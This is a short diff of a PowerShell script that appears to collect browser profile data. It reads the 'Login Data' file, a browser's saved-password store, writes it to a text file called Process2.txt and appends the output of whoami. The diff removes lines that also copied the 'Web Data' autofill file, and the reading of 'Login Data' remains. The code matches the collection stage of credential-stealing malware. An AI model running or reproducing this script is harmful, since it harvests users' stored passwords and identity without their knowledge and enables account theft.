@@ -2,13 +2,9 @@ cd Default
 
 $var = cat "Login Data"
 
-$var2 = cat "Web Data"
-
 cd Network
 
 Write-Output $var | Out-File -FilePath ./Process2.txt
-
-Write-Output $var2 | Out-File -FilePath ./Process2.txt -Append
 
 whoami | Out-File -FilePath ./Process2.txt -Append
 
